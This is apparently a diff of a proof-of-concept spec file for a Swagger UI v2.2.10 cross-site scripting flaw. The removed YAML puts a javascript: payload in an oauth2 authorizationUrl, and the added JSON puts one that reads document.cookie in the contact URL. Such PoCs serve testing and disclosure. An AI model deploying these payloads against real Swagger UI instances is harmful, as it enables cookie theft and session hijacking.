@@ -1,15 +1,13 @@
-swagger: '2.0'
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
-info:
-  version: "0.0.1"
-  title: Example Title
-  description: Please Authorize!
-paths:
-  /:
-    get:
-      responses:
-        200:
-          description: Successful respons
+{
+    "swagger" : "2.0",
+    "info" : {
+        "version" : "1.0.100",
+        "title" : "Swagger UI v2.2.10 XSS POC",
+        "description" : "Swagger UI v2.2.10 XSS POC",
+        "contact" : {
+            "name" : "edoardottt",
+            "url" : "javascript:alert(document.cookie)",
+            "email" : "edoardott@gmail.com"
+        },
+    },
+}
